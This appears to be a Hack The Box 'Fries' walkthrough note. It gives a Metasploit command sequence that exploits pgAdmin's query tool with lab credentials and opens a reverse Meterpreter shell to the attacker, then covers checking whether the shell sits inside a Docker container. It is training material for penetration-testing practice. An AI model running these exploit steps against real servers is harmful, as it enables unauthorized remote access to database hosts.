![[cve2025-2945.png]]

## pgAdmin Exploitation with Metasploit

#Attacking_machine 
Run the following:

```
msfconsole
use exploit/multi/http/pgadmin_query_tool_authenticated
set RHOSTS db-mgmt05.fries.htb
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS PsqLR00tpaSS11
set DB_NAME ps_db
set LHOST <ATTACKING MACHINE IP>
set LPORT 4444
exploit
```

![[msfconsole.png]]

You'll get a meterpeter.

## ðŸ§­ **Container vs Host Enumeration â€” The Core Idea**

When you land a shell (Meterpreter, reverse shell, etc.), you must determine:

> **Am I inside a container or on the actual host machine?**

This matters because containers are isolated environments with limited privileges, and the real goal is usually to pivot out of them.

### **Why This Matters on HTB (Including Fries)**

HTB machines often use containers to teach:

- Isolation boundaries
    
- Misconfigured secrets
    
- Pivoting from container â†’ host
    
- Understanding service architecture
    

On _Fries_, the machine intentionally places you inside a container first. Your job is to:

1. Recognize it
    
2. Enumerate it
    
3. Understand what secrets or misconfigurations exist
    
4. Use that knowledge to reach the next stage
    

This is exactly the kind of thinking real penetration testers use.

### Checkin out

#meterpreter
Check if you have a shell on is running inside a Docker container.

```
meterpreter > run post/linux/gather/checkcontainer 
```

![[docker_container.png]]


![[pgAdmin_continer_diagram.png]]


**Next step:** [[Docker Network Exploration]]
